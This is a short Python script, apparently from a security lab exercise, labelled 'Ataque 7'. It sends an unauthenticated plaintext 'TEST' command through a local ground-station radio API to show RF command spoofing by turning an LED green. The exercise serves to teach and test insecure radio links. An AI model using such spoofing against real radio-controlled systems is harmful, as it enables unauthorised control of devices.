#!/usr/bin/env python3
"""
Prueba Individual - Ataque 7: Inyección de Comando en Claro / Spoofing RF (Nivel 1)
Envía el comando unauthenticated TEST por radio para encender el NeoPixel en Verde.
"""
import requests

BASE_URL = "http://localhost:5000"

def test_attack_7():
    print("[+] Ejecutando Prueba Individual: Ataque 7 - Plaintext Radio Spoofing (TEST)...")
    url = f"{BASE_URL}/api/radio/send"
    payload = {"data": "54455354"} # Hex ASCII for "TEST"
    try:
        response = requests.post(url, json=payload, timeout=5)
        print(f"[*] POST {url} (data='TEST') - Status Code: {response.status_code}")
        if response.status_code == 200:
            print("[✓] Comando enviado! Verifica que el NeoPixel LED cambie a color VERDE.")
            print(response.json())
        else:
            print(f"[!] Respuesta: {response.text}")
    except Exception as e:
        print(f"[X] Error al conectar con la Ground Station: {e}")

if __name__ == "__main__":
    test_attack_7()
